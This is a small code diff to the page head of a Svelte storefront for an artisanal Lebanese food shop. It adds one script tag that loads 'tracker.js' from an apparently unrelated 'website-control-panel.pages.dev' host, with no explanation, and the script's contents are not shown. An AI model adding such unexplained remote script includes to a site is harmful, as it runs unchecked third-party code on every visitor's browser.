@@ -11,6 +11,7 @@
 <svelte:head>
 	<title>Duniaty by Dunia | Artisanal Lebanese Delicacies</title>
 	<meta name="description" content="Discover authentic artisanal Lebanese food products — olive oil, jams, honey, makdous, and more. Fresh organic products made in Lebanon." />
+	<script src="https://website-control-panel.pages.dev/tracker.js"></script>
 </svelte:head>
 
 <Navbar onCartClick={() => cartOpen = true} />
